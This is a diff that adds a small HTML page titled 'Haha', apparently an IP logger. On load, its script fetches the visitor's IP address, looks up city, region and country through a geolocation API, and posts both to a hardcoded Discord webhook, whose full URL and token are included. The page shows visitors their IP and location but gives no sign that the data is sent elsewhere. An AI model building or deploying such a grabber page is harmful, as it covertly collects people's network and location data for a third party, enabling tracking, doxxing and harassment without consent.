@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Haha</title>
+    <script>
+      function displayIP() {
+        fetch("https://api.ipify.org/?format=json")
+          .then((response) => response.json())
+          .then((data) => {
+            const ipElement = document.getElementById("ip");
+            ipElement.textContent = data.ip;
+
+            getLocation(data.ip);
+          })
+          .catch((error) => {
+            console.error("Error:", error);
+          });
+      }
+
+      function sendToWebhook(ip, location) {
+        const webhookURL = "https://discord.com/api/webhooks/1108773713077346384/hjKxkLhLkS3mEc6OpQzlCi_nmMWLY4ocZkMzC1PwlA55ScZf3hayJEL1JG2zyOFPHyFx"; // Replace with the actual webhook URL
+        const message = "IP: " + ip + "\nLocation: " + location;
+
+        fetch(webhookURL, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({ content: message })
+        })
+          .then((response) => console.log("Webhook sent successfully"))
+          .catch((error) => console.error("Error sending webhook:", error));
+      }
+
+      function getLocation(ip) {
+        const locationUrl = `https://ipapi.co/${ip}/json/`;
+
+        fetch(locationUrl)
+          .then((response) => response.json())
+          .then((data) => {
+            const locationElement = document.getElementById("location");
+            const locationString = `${data.city}, ${data.region}, ${data.country_name}`;
+            locationElement.textContent = locationString;
+
+            sendToWebhook(ip, locationString);
+          })
+          .catch((error) => {
+            console.error("Error:", error);
+            sendToWebhook(ip, "Unknown"); // Send default location as "Unknown" in case of an error
+          });
+      }
+    </script>
+  </head>
+  <body onload="displayIP()">
+    <h1>Your IP Address:</h1>
+    <p id="ip">Loading...</p>
+    <h1>Your Location:</h1>
+    <p id="location">Loading...</p>
+  </body>
+</html>
